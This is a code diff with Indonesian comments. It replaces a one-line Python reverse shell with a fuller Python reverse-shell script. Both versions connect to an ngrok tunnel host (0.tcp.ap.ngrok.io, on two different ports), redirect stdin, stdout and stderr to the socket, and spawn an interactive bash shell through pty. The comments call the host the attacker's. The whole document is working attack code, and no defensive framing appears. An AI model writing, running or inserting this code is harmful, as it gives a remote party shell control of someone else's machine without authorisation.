@@ -1,1 +1,34 @@
-export RHOST="0.tcp.ap.ngrok.io";export RPORT=15236;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+import socket
+import os
+import pty
+
+# Konfigurasi Ngrok
+# Host: 0.tcp.ap.ngrok.io
+# Port: 10038
+
+def reverse_shell():
+    attacker_host = "0.tcp.ap.ngrok.io"
+    attacker_port = 10038
+
+    try:
+        # Membuat socket TCP
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Koneksi ke tunnel Ngrok
+        s.connect((attacker_host, attacker_port))
+        
+        # Duplikasi file descriptor untuk stdin, stdout, dan stderr
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        
+        # Menjalankan shell interaktif
+        # pty.spawn memberikan shell yang lebih stabil daripada os.system
+        pty.spawn("/bin/bash")
+    except Exception as e:
+        pass
+    finally:
+        s.close()
+
+if __name__ == "__main__":
+    reverse_shell()
